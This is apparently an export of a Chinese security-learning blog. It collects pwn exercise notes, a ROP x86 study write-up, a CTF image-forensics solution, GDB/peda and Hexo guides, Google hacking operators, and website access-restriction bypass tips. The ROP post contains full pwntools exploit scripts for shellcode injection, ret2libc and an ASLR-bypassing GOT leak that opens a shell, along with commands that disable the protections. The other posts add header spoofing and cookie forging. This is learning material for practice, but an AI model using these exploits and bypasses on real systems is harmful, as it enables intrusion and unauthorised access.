Shellcode通常需要使用汇编语言进行开发，并转换成二进制机器码，其内容和长度经常还会受到很多实际条件的限制，因此开发Shellcode通常都是非常困难的。在实际场景中，我们通常使用Metasploit这个工具来定制各种功能的Shellcode，当然也可以去网上查找一些现有的Shellcode进行测试，通常在shell-storm以及exploit-db等网站上都能找到一些比较成熟和稳定的shellcode，网址为： http://shell-storm.org/shellcode/ http://www.exploit-db.com/shellcode/ 具有复杂功能的Shellcode无法作用于不同类型的操作系统（如Windows、Linux）将pwn6.py 脚本写到test文件里面 然后把test文本拖到pwn6程序里面运行。 python pwn6.py test./pwn6 &lt; test shellcod的python脚本 shellcode = (“\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe” +“\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff” +“\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69” +“\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81”) print ‘A’*76 + ‘\xd0\xd6\xff\xff’ + shellcode 七、Pwn基础练习7一、__builtin_return_address函数 builtin_return_address函数接收一个参数，可以是0,1,2等。builtin_return_address(0)返回当前函数的返回地址，如果参数增大1，那么就往上走一层获取主调函数的返回地址. 二、理解多层跳转 retn指令从栈顶弹出一个数据并赋值给EIP寄存器，程序继续执行时就相当于跳转到这个地址去执行代码了。 如果我们将返回地址覆盖为一条retn指令的地址，那么就又可以执行一条retn指令了，相当于再在栈顶弹出一个数据赋值给EIP寄存器。 三、函数作用 fflush()用于清空文件缓冲区，如果文件是以写的方式打开 的，则把缓冲区内容写入文件。其原型为： int fflush(FILE* stream); 【参数】stream为文件指针。 【返回值】成功返回0，失败返回EOF，错误代码存于errno 中。指定的流没有缓冲区或者只读打开时也返回0值。 fflush()也可用于标准输入（stdin）和标准输出（stdout），用来清空标准输入输出缓冲区。 stdin 是 standard input 的缩写，即标准输入，一般是指键盘；标准输入缓冲区即是用来暂存从键盘输入的内容的缓冲区。 stdout 是 standard output 的缩写，即标准输出，一般是指显示器；标准输出缓冲区即是用来暂存将要显示的内容的缓冲区。 八、Pwn基础练习8二、strdup函数 strdup可以用于复制一个字符串，我们通常使用字符串时会使用strcpy，这要求已经定义好了一个接收缓冲区。而strdup只接受一个参数，也就是要复制的字符串的地址，strdup()会先用maolloc()配置与参数字符串相同大小的的空间，然后将参数字符串的内容复制到该内存地址，然后把该地址返回。strdup返回的地址最后可以利用free()来释放。 三、grep命令 当输出信息非常多的时候，我们很难快速找到我们感兴趣的信息。使用grep命令可以对匹配特定正则表达式的文本进行搜索，并只输出匹配的行或文本。 我们可以使用管道将一个程序的输出当做grep的输入数据，grep会根据给定的正则表达式参数对输入数据进行过滤。 对于grep的参数需要注意这样一个问题：当参数中存在空格时需要用双引号将参数包裹起来，此外，是正则表达式里面的通配符，如果要查找，需要使用反斜杠进行转移，即*。]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一步一步学ROP之x86篇]]></title>
    <url>%2F2017%2F02%2F08%2F%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Bx86%E7%AF%87%2F</url>
    <content type="text"><![CDATA[根据寒假计划的第三计划，是该学习rop了。下面是学习rop之linux_x86篇的学习笔记以及总结。 语知其事，先解其意。rop是什么？ 一、ROP ROP的全称为Return-oriented programming（返回导向编程），这一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等） 了解了其意思，下面就是学习内容 第一、Control Flow Hijack 程序流劫持这是一个较为常见的程序流劫持，其宗旨就是栈溢出，格式化字符串攻击和栈溢出。通过这个手段，攻击者可以做的就是控制PC指针然后执行目标代码，想要应对这个攻击，在linux系统下也是有保护机制存在的： 1、DEP(堆栈不可执行)：这也就是gcc编译器gs验证码机制，这是专门防止缓冲区溢出而采取的保护措施，具体方法是gcc首先在缓冲区被写入之前在buf的结束地址之后返回地址之前放入随机的gs验证码，并在缓冲区写入操作结束时检验该值。通常缓冲区溢出会从低地址到高地址覆写内存，所以如果要覆写返回地址，则需要覆写该gs验证码。这样就可以通过比较写入前和写入后gs验证码的数据，判断是否产生溢出。 此机制的关闭方法是：在gcc编译时采用-fno-stack-protector选项。 2、ASLR(内存地址随机化)：在Ubuntu个其他Linux内核的系统中，目前都采用的内存地址随机话机制，这将会使得猜测具体的内存地址变得十分困难。 此机制的关闭方法是：sysctl -w kernel.randomize_va_space=0 3、Stack Protector(栈保护)：对于Federal系统，默认会执行可执行程序的屏蔽保护机制，该机制不允许执行存储在栈中的代码，这会使得缓冲区溢出攻击变得无效。而Ubuntu系统中默认没有采用这种机制。 此机制的关闭方法是：sysctl –w kernel.exec-shield=0 gcc下：-z execstack 机制了解了下面来一个实际的操作，初学练习就要把保护机制全部关闭。就用书上所用到的这个例子好了。 根据大神的指引，初学先把Linux下的保护机制全部关闭，指令如下：这个命令编译程序。-fno-stack-protector和-z execstack这两个参数会分别关掉DEP和Stack Protector。下面的指令就是关闭Linux系统的ASpapLR保护 关闭之后就先开始对这个程序进行分析。先在python下创建150个测试数据gdb的插件peda自带pattern脚本直接生成 然后开始run进行调试 可以看出来错误地址是0x41416d41 然后使用指令可以计算PC返回值覆盖点为140个字节，所以只要构造一个“A”*140+ret字符串就可以让PC执行我们所需要的指令 之后就是需要一段shellcod，获取方法很多，网上找现成的，msf自动生成，作为初学者，shellcode不好找，因为gdb调试的时候会影响buf在内存的地址根据大神指示，有一个好的方法:开启core dump这个功能 ulimit -c unlimited sudo sh -c ‘echo “/tmp/core.%t” /proc/sys/kernel/core_pattern’ 开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。 因为溢出点是140个字节，再加上4个字节的ret地址，我们可以计算出buffer的地址为$esp-144。通过gdb的命令 “x/10s $esp-144”，我们可以得到buf的地址为0xbffff029。 现在溢出点，shellcode和返回值地址都有。可以写exp了，最终测试代码如下: #!python #!/usr/bin/env python from pwn import * p = process(&apos;./test&apos;) ret = 0xbffff029 shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot; shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot; shellcode += &quot;\x0b\xcd\x80&quot; # p32(ret) == struct.pack(&quot;&lt;I&quot;,ret) #对ret进行编码，将地址转换成内存中的二进制存储形式 payload = shellcode + &apos;A&apos; * (140 - len(shellcode)) + p32(ret) p.send(payload) #发送payload p.interactive() #开启交互shell 接下来我们把这个目标程序作为一个服务绑定到服务器的某个端口上，这里我们可以使用socat这个工具来完成，命令如下： socat TCP4-LISTEN:10001,fork EXEC:./test 随后这个程序的IO就被重定向到10001这个端口上了，并且可以使用 nc 127.0.0.1 10001来访问我们的目标程序服务了。 因为现在目标程序是跑在socat的环境中，exp脚本除了要把p = process(‘./level1’)换成p = remote(‘127.0.0.1’,10001) 之外，ret的地址还会发生改变。解决方法还是采用生成core dump的方案，然后用gdb调试core文件获取返回地址。然后我们就可以使用exp进行远程溢出啦！ 第二、Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护学习DEP就把DEP打开，其他两个（stack protector 和ASLR）依旧关闭开启DEP指令如下： gcc -fno-stack-protector -o test test.c 此时打开了DEP防护，那么如果还是提交上面那个脚本的话，系统会拒绝我们执行shellcode，现在的测试程序为rw，而上面确实rwx 我们知道test2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。 $ gdb ./test2 GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04 …. (gdb) break main Breakpoint 1 at 0x8048430 (gdb) run Starting program: /home/mzheng/CTF/groupstudy/test/test2 Breakpoint 1, 0x08048430 in main () (gdb) print system $1 = {&lt;text variable, no debug info&gt;} 0xb7e5f460 &lt;system&gt; (gdb) print __libc_start_main $2 = {&lt;text variable, no debug info&gt;} 0xb7e393f0 &lt;__libc_start_main&gt; (gdb) find 0xb7e393f0, +2200000, &quot;/bin/sh&quot;(gdb如果安装有peda插件貌似这跳命令找不到) 0xb7f81ff8 warning: Unable to access target memory at 0xb7fc8500, halting search. 1 pattern found. (gdb) x/s 0xb7f81ff8 0xb7f81ff8: &quot;/bin/sh&quot; 我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过”print system”这个命令来获取system函数在内存中的位置，随后我们可以通过” print __libc_start_main”这个命令来获取libc.so在内存中的起始位置，接下来我们可以通过find命令来查找”/bin/sh”这个字符串。这样我们就得到了system的地址0xb7e5f460以及”/bin/sh”的地址0xb7f81ff8。下面我们开始写exp： #!python #!/usr/bin/env python from pwn import * p = process(&apos;./level2&apos;) #p = remote(&apos;127.0.0.1&apos;,10002) ret = 0xdeadbeef systemaddr=0xb7e5f460 binshaddr=0xb7f81ff8 payload = &apos;A&apos;*140 + p32(systemaddr) + p32(ret) + p32(binshaddr) p.send(payload) p.interactive() 第三、ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护下面打开ASLR保护，指令如下 sudo -s echo 2 /proc/sys/kernel/randomize_va_space 从现在开始会发现test的libc.so的地址每次都会变化。我们需要先泄漏出libc.so某些函数在内存中的地址，然后再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，然后再执行我们的ret2libc的shellcode。所以我们只要把返回值设置到程序本身就可执行我们期望的指令了。首先我们利用objdump来查看可以利用的plt函数和函数对应的got表： 我们发现除了程序本身的实现的函数之外，我们还可以使用read@plt()和write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write@plt()[此函数用于确定动态库中函数地址]函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got 跳转到真正的write()函数上去。因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以计算出system()在内存中的地址了。然后我们再将pc指针return回vulnerable_function()函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。使用ldd【 ldd命令用于判断某个可执行的 binary 档案含有什么动态函式库】命令可以查看目标程序调用的so库。随后我们把libc.so拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址： 最后写exp： #!python #!/usr/bin/env python from pwn import * libc = ELF(&apos;libc.so&apos;) elf = ELF(&apos;test3&apos;) p = process(&apos;./test3&apos;) #p = remote(&apos;127.0.0.1&apos;, 10003) plt_write = elf.symbols[&apos;write&apos;] print &apos;plt_write= &apos; + hex(plt_write) got_write = elf.got[&apos;write&apos;] print &apos;got_write= &apos; + hex(got_write) vulfun_addr = 0x0804844d print &apos;vulfun= &apos; + hex(vulfun_addr) payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(got_write) + p32(4) print &quot;\n###sending payload1 ...###&quot; p.send(payload1) print &quot;\n###receving write() addr...###&quot; write_addr = u32(p.recv(4)) print &apos;write_addr=&apos; + hex(write_addr) print &quot;\n###calculating system() addr and \&quot;/bin/sh\&quot; addr...###&quot; system_addr = write_addr - (libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;]) print &apos;system_addr= &apos; + hex(system_addr) binsh_addr = write_addr - (libc.symbols[&apos;write&apos;] - next(libc.search(&apos;/bin/sh&apos;))) print &apos;binsh_addr= &apos; + hex(binsh_addr) payload2 = &apos;a&apos;*140 + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr) print &quot;\n###sending payload2 ...###&quot; p.send(payload2) p.interactive() 小结：本文主要根据大牛的文章一步一步进行操作和学习，当然一下子也很难全部接受，后面还要多加温习，熟能生巧。]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[practice-1之图片reverse]]></title>
    <url>%2F2017%2F01%2F30%2Fpractice-1%E4%B9%8B%E5%9B%BE%E7%89%87reverse%2F</url>
    <content type="text"><![CDATA[嗯，找了好久在我能找的范围内都是算法大大相关的题目。 今儿无意发现reverse下有一道跟图片有关的题目，做了一下。了解了一个工具：C32Asm的用法以及隐藏flag的一种方法。就当开头长个见识了（至少我没见过！） 工具了解C32Asm: 静态反编译工具，C32Asm现具有如下功能：快速静态反编译PE格式文件(Exe、Dll等)，提供Hex文件编辑功能，功能强大，提供内存Dump、内存编辑、PE文件Dump、PE内存ImageSize修正等多种实用功能。 图片分析相关知识Exif： Exif是一种图像文件格式，储存个是与JPGE格式是完全相同的。Exif格式是在JPGE格式头部插入了数码照片的信息。（这个知识点里面还是可能隐藏flag的，以前遇到过）简单来说：Exif=JPGE+拍摄参数。 看题 一只可爱的小狗看看这个图片的信息。除了一些基本信息并没有隐藏着Exif的提示信息 OK，那么现在就用工具进行解析。下面就用C32Asm打开这个图片进行分析（其实Hex工具也可以）开头看到BM字符说明这个图片是BMP位图。 根据图片文字提示“奇怪的狗尾巴”（不用这个提示也习惯看完开头看结尾）。拉到结尾。发现IHDR 和 IEND这两个老搭配（当一个图片文件里有前者的时候必须找到后者这个图片才是合法的。加载两者中间的就是IDAT块儿，即图像数据信息。） 猜想：那么前面一定也有PNG标志。往前找，对的。下面要做的就是把这个PNG图片单独提取出来了 在该工具下再打开16进制文件保存又会得到一个二维码图片 扫描出现的是一个URL:http://blog.sina.com.cn/s/blog_703d65470102v6tf.html。 还是直接贴图片了。又是它， 不过提示换了。一个异或算法。 不知道异或个啥，全选数据，新知识，修改数据可以自动全部进行数据的异或。flag出来了]]></content>
      <tags>
        <tag>practice writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[寒假计划]]></title>
    <url>%2F2017%2F01%2F16%2F%E5%AF%92%E5%81%87%E8%AE%A1%E5%88%92%2F</url>
    <content type="text"><![CDATA[寒假到了，一个关键的时间。定下一个学习计划来提升。 1、自主练习学习python参考书籍以及网上的知识自己进行python程序的练习，把网盘资料里的80个程序进行编辑练习。 2、逆向破解练习自己找10道对于算法无关的逆向题目进行破解，每题搞懂，将所得写到writeup上传博客。 3、一步一步学rop x86篇对于这篇文章自己进行学习，并写总结上传博客。 4、linux系统了解linux下的保护机制，一些常见漏洞的了解。]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GDB寄存器和内存查询指令]]></title>
    <url>%2F2016%2F11%2F12%2FGDB%E5%AF%84%E5%AD%98%E5%99%A8%E5%92%8C%E5%86%85%E5%AD%98%E6%9F%A5%E8%AF%A2%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[今天下午学习pwn的基础知识，遇到了两个查询容易弄扯，在这儿总结下子。 1、查看寄存器 (gdb) i r(gdb) i r a # 查看所有寄存器（包括浮点、多媒体）(gdb) i r esp(gdb) i r pc 2、查看内存 (gdb) x /wx 0x80040000 # 以16进制显示指定地址处的数据(gdb) x /8x $esp(gdb) x /16x $esp+12(gdb) x /16s 0x86468700 # 以字符串形式显示指定地址处的数据(gdb) x /24i 0x8048a51 # 以指令形式显示指定地址处的数据（24条） 3、修改寄存器的值 (gdb) set $v0 = 0x004000000(gdb) set $epc = 0xbfc00000 4、修改内存的值 (gdb) set {unsigned int}0x8048a51=0x0(gdb) set (unsigned int)0x8048a54=0x55aa55aa 5、内存搜索 Usage: find (gdb) define findset $ptr = $arg0set $cnt = 0while ( ($ptr&lt;=$arg1) &amp;&amp; ($cnt&lt;$arg2) ) if ( (unsigned int )$ptr == $arg3 ) x /wx $ptr set $cnt = $cnt + 1 end set $ptr = $ptr + 4endend 6、断点、监测点 (gdb) b 0x80400000(gdb) watch (unsigned int *)0xbffff400==0x90909090]]></content>
      <tags>
        <tag>pwn reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gdb与peda指令学习学习笔记]]></title>
    <url>%2F2016%2F10%2F30%2Fgdb%E4%B8%8Epeda%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[下午学习的gdb指令。傻傻的对一个自己的程序输入打开指令打不开。问问才知道要先转换成可执行文件，上网有学学gcc指令收获不少啊。。 遇到问题1、写了一个C++语言但是用指令转换成可执行文件时候呢显示iostream不存在解决：对于C语言使用的转换指令是（假设文件是doc.c）将C语言的文件doc.c转换为了doc gcc doc.c -o doc 还有一个默认转换，也就是后面可以不加你转换的名字，系统默认转换后的名字为a.out gcc doc.c 对于C++语言使用的转换指令是 g++ doc.c -o doc 2、显示j=strlen(s)语句出错。解决：原来linux的习惯，strlen声明放在 string.h 中(linux系统中可以通过man strlen来查看其帮助和所在头文件)，仅仅 #include 只是引入了 std::string，还需要 #include ###3、其他指令(1)、 将test.c预处理输出test.i文件。 gcc -E test.c -o test.i (2)、 将预处理输出文件test.i汇编成test.s文件。 gcc -E test.c -o test.i (3)、 将汇编输出文件test.s编译输出test.o文件。 gcc -c test.s (4)、 将编译输出文件test.o链接成最终可执行文件test。 gcc test.o -o test (5)、 使用编译优化级别1编译程序。级别为1~3，级别越大优化效果越好，但编译时间越长。 gcc -O1 test.c -o test 4、多源文件的编译方法(1)、多个文件一起编译将testfun.c和test.c分别编译后链接成test可执行文件。 gcc testfun.c test.c -o test (2)、分别编译各个源文件，之后对编译后输出的目标文件链接。将testfun.c编译成testfun.o将test.c编译成test.o将testfun.o和test.o链接成test gcc -c testfun.cgcc -c test.cgcc -o testfun.o test.o -o test 在搜索的过程中也发现了一个好玩的命令就先记录下吧，这是个gdb下的指令。 如果想看看现在的默认反汇编格式是什么，可以使用如下命令 (gdb) show disassembly-flavor 如果看不懂，那就转换汇编格式 (gdb) set disassembly-flavor intel 经过以上的步骤就可以把想要的可执行文件得到，下面就是对程序进行指令分析。程序为(doc) 运行程序看看 ./doc 进入gdb指令下。（gdb + doc）反编译 disassemble main 下面是基础的调试指令 名称 介绍 用法 r r 是run的简写，也就是在GDB下运行程序。（如果有设置断点会运行到断点） （gdb）r c C是continue的简写，就是继执行被调试的程序，直到下一次断点处或者结束 （gdb）c b &lt;行号&gt;/&lt;函数名称&gt;/&lt;函数名称&gt;/&lt;代码地址&gt; b 是breakpoint的简写，就是设置断点，可以使用行号，函数名，执行地址进行下断。而函数名前加一个*则表示将断点设置在“由编译器生成的prolog代码处”，者在了解汇编后可以理解。 （gdb）b 8、（gdb）b main 、(gdb)b main 、（gdb）b 0x8048534 d [编号] d 是delete breakpoint的简写，就是删除制定编号后的断点，也可以一次删去所有断点。 （gdb）d 2 p &lt;变量名称&gt; P是print的简写，显示指定变量的值（临时变量或全局变量）。 （print）p n q 不需要多解释了，就是退出调试 （gdb）q S 执行一行源代码，如果此行代码有函数调用，进入该函数，也就相当于其他调试器的单步步入。 （gdb）s n 执行一段源代码，代码中的函数调用也一并执行，也就相当于其他调试器的单步步过。 （gdb）n Si ,ni 这两个对应着的是s和n。不同的是这两个是对汇编语言的，而前两个是对源代码的。 （gdb）si、（gdb）ni 然后是peda的一些指令 checksec –检查二进制的各种安全选项dumpargs –当在调用指令时停止显示参数传递给函数elfheader–调试文件的标题指令elfsymbol–从一个精灵文件获得非调试符号信息lookup –搜索所有的地址/参考地址属于一个内存范围readelf –从一个逆向文件获取标题信息patch –内存补丁开始在字符串/ hexstring /诠释一个地址（？）pattern –生成、搜索或写一个循环模式到内存pshow –显示各种PEDA选项和其他设置pset –设置各种peda选项和其他设置procinfo –显示从/ proc / PID的各种信息shellcode –生成或下载常见shellcodesxormem –一个密钥异或内存区vmmap –在调试过程中获得部分（S）的虚拟映射地址范围ropgadget–得到的二进制或静态库共同ROP小工具ropsearch –记忆中搜索rop小工具使用skeleton –Python开发代码生成模板dumprop –丢弃在特定的内存范围内所有ROP小工具searchmem|find –在记忆中搜索模式；支持正则表达式搜索 指令中提到了一个ROP，也不知道是啥，去搜一搜，原来：ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等） 这个溢出攻击可参照网址：http://www.programlife.net/linux-rop-stack-overflow.html]]></content>
      <tags>
        <tag>pwn reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo搭建]]></title>
    <url>%2F2016%2F09%2F04%2Fhexo%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[Hexo搭建Github静态博客 应用GitHub Pages创建属于自己的个人博客，GitHub将提供免费的空间。GitHub提供的域名（用户名+github+io）,在Repository name对应处填写资源名，其需要使用自己的用户名，每个用户名下面只能建立一个，并且资源命名必须符合这样的规则username/username.github.io，之后勾选下面的”Initialize this repository with a README” 1.环境1.1安装Git下载地址：https://git-scm.com/download/win下载安装包后正常安装即可。 1.2安装node.js下载地址：http://nodejs.org/download/可以下载 node-v0.10.33-x64.msi安装时直接保持默认配置即可。 2.配置Github1.1建立Repository建立与你用户名对应的仓库，仓库名必须为【your_user_name.github.io】 1.2配置SSH-Key参考：http://beiyuu.com/github-pages 3.安装Hexo关于Hexo的安装配置过程，请以官方Hexo给出的步骤为准。 3.1Installation打开Git命令行，执行如下命令 $ npm install -g hexo 3.2 Quick Start1.Setup your blog在电脑中建立一个名字叫「Hexo」的文件夹（比如我建在了D:\Hexo），然后在此文件夹中右键打开Git Bash。执行下面的命令 $ hexo init[info] Copying data[info] You are almost done! Don’t forget to run npm install before you start blogging with Hexo! Hexo随后会自动在目标文件夹建立网站所需要的文件。然后按照提示，运行 npm install（在 /D/Hexo下） npm install 会在D:\Hexo目录中安装 node_modules。 2.Start the server运行下面的命令（在 /D/Hexo下） $ hexo server[info] Hexo is running at http://localhost:4000/. Press Ctrl+C to stop. 3. Create a new post新打开一个git bash命令行窗口，cd到/D/Hexo下，执行下面的命令 $ hexo new “My New Post”[info] File created at d:\Hexo\source_posts\My-New-Post.md 刷新http://localhost:4000/，可以发现已生成了一篇新文章 “My New Post”。 NOTE:有一个问题，发现 “My New Post” 被发了2遍，在Hexo server所在的git bash窗口也能看到create了2次。 $ herxo serve[info] Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.[create] d:\Hexo\source_posts\My-New-Post.md[create] d:\Hexo\source_posts\My-New-Post.md 经验证，在hexo new “My New Post” 时，如果按Ctrl+C将hexo server停掉，就不会出现发2次的问题了。 所以，在hexo new文章时，需要stop server。 4. Generate static files执行下面的命令，将markdown文件生成静态网页 $ hexo generate 该命令执行完后，会在 D:\Hexo\public\ 目录下生成一系列html，css等文件。 5. 编辑文章 hexo new “My New Post”会在D:\Hexo\source_posts目录下生成一个markdown文件：My-New-Post.md可以使用一个支持markdown语法的编辑器（比如 Sublime Text 2）来编辑该文件。 6. 部署到Github 部署到Github前需要配置_config.yml文件，首先找到下面的内容 #Deployment ##Docs: http://hexo.io/docs/deployment.htmldeploy: type: 然后将它们修改为 #Deployment ##Docs: http://hexo.io/docs/deployment.htmldeploy: type: github repository: git@github.com:zhchnchn/zhchnchn.github.io.git branch: master NOTE1:Repository：必须是SSH形式的url（git@github.com:zhchnchn/zhchnchn.github.io.git），而不能是HTTPS形式的url（https://github.com/zhchnchn/zhchnchn.github.io.git），否则会出现错误： $ hexo deploy[info] Start deploying: github[error] https://github.com/zhchnchn/zhchnchn.github.io is not a valid repositor URL! 使用SSH url，如果电脑没有开放SSH 端口，会致部署失败。 fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists. NOTE2：如果你是为一个项目制作网站，那么需要把branch设置为gh-pages。7. 测试当部署完成后，在浏览器中打开http://zhchnchn.github.io/（https://zhchnchn.github.io/） ，正常显示网页，表明部署成功。8. 总结：部署步骤每次部署的步骤，可按以下三步来进行。 hexo cleanhexo generatehexo deploy 9. 总结：本地调试 在执行下面的命令后， $ hexo g #生成$ hexo s #启动本地服务，进行文章预览调试 浏览器输入http://localhost:4000，查看搭建效果。此后的每次变更_config.yml 文件或者新建文件都可以先用此命令调试，尤其是当你想调试新添加的主题时。 2. 可以用简化的一条命令 hexo s -g 命令总结3.3.1常用命令 hexo new “postName” #新建文章hexo new page “pageName” #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，’ctrl + c’关闭server）hexo deploy #将.deploy目录部署到GitHubhexo help # 查看帮助hexo version #查看Hexo的版本 3.3.2 hexo deploy -g #生成加部署hexo server -g #生成加预览 命令的简写为： hexo n == hexo newhexo g == hexo generatehexo s == hexo serverhexo d == hexo deploy 4 配置Hexo4.1 配置文件介绍下面的各个部分的介绍，请直接参考【3】。 1._config.yml配置文件介绍NOTE：在修改_config.yml配置文件时，按照【3】的介绍进行修改后，重新 hexo clean 或者hexo deploy时，可能会出现如下错误： $ hexo clean[error] { name: ‘HexoError’, reason: ‘can not read a block mapping entry; a multiline key may not be an imp licit key’, mark: { name: null, buffer: ‘# Hexo Configuration\n## Docs: http://hexo.io/docs/configuration.h tml\n## Source: https://github.com/hexojs/hexo/\n\n# Site\ntitle: Zhchnchn\nsubt itle: Coding on the way\ndescription: Zhchnchn\’s blog\nauthor: Zhchnchn\nemail:115063497@qq.com\nlanguage:zh-CN\n\n# URL\n## If your site is put in a subdirect …… , position: 249, line: 12, column: 0 }, message: ‘Config file load failed’, domain: { domain: null, _events: { error: [Function] }, _maxListeners: 10, members: [ [Object] ] }, domainThrown: true, stack: undefined } 我的_config.yml配置文件是一个空行，所以错误肯定在前面，经过对比发现，我前面修改了一下 # Site的各项设置，在冒号:后面没留空格导致了该问题，请对比一下下面的区别： 错误的设置： author:Zhchnchnemail:XXX@qq.comlanguage:zh-CN 正确的设置： author: Zhchnchnemail: XXX@qq.comlanguage: zh-CN (问题在于必须要有空格) 4.2 安装主题Hexo提供了很多主题，具体可参见Hexo Themes【4】。这里我选择使用Pacman主题。具体设置方法如下【5】 4.2.1安装 将Git Shell 切到/D/Hexo目录下，然后执行下面的命令，将pacman下载到 themes/pacman 目录下。 $ git clone https://github.com/A-limon/pacman.git themes/pacman 修改你的博客根目录/D/Hexo下的config.yml配置文件中的theme属性，将其设置为pacman。 更新pacman主题 cd themes/pacmangit pull NOTE：先备份_config.yml 文件后再升级 4.4.2配置如果pacman的默认设置不能满足需要的话，你可以修改 /themes/pacman/下的配置文件_config.yml来定制。 详细主题跟新安装参照【http://blog.csdn.net/qq_23435721/article/details/50938038】 5.发布文章 $ hexo new “My New Post”[info] File created at d:\Hexo\source_posts\My-New-Post.mdhexo g #生成静态文件hexo g -d #部署到Github]]></content>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Google hacking 语法]]></title>
    <url>%2F2016%2F09%2F03%2FGoogle-hacking-%E8%AF%AD%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1.单词语法 intext:这个就是把网页中的正文内容中的某个字符做为搜索条件，例如在google里输入：intext：动网，将返回所有在网页正文部分包含”动网”的网页。 allintext:使用方法和intext类似. intitle:和上面那个intext差不多，搜索网页标题中是否有我们所要找的字符，例如搜索：intitle：安全天使，将返回所有网页标题中包含“安全天使”的网页。同理allintitle也同intitle类似。 cache:搜索google里关于某些内容的缓存，有时候也许能找到一些好东西哦。 define:搜索某个词语的定义。搜索：define：hacker，将返回关于hacker的定义。 filetype:这个我要重点推荐一下，无论是撒网式攻击还是我们后面要说的搜索指定类型的文件。例如输入：filetype：doc，将返回所有以doc结尾的文件URL。当然如果你找.bak、.mdb或.inc也是可以的，获得的信息也许会更丰富。 info:查找指定站点的一些基本信息。 inurl:搜索我们指定的字符是否存在于URL中。例如输入：inurl：admin，将返回N个类似于这样的连接：http://www.xxx.com/xxx/admin。用来找管理员登陆的URL不错。allinurl也同inurl类似，可指定多个字符。 符号语法+ 把google可能忽略的字列如查询范围 -把某个字忽略 ~同意词 .单一的通配符 *通配符，可代表多个字母 “”精确查询]]></content>
      <tags>
        <tag>search</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[绕过网站访问限制的方法]]></title>
    <url>%2F2016%2F09%2F03%2F%E7%BB%95%E8%BF%87%E7%BD%91%E7%AB%99%E8%AE%BF%E9%97%AE%E9%99%90%E5%88%B6%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1.只允许国外访问: 将 HTTP 请求头中的 Accept-Language 为中文(cn-zh)，修改为英文(en-us)。 2.浏览器限制访问:修改 HTTP 请求中的 User-Agent 信息。里面标注的有访问所用的浏览器和系统版本。也可以使用火狐的default user agent插件进行修改。 3.IP地址限制访问：跟 HTTP 请求头中的 X-Forwarded-For、client-ip、remote_addr 有关系，也可以使用代理进行访问。 4.用户登陆限制访问：可能是 Cookie 的问题，如果 Cookie 比较简单，可以尝试构造cookie。 5.隐藏信息：查看 robots.txt 可以获得该网站的一些信息。 6.其他：有一些加referer加上代理ip PS：原文:(http://byd.dropsec.xyz)]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
</search>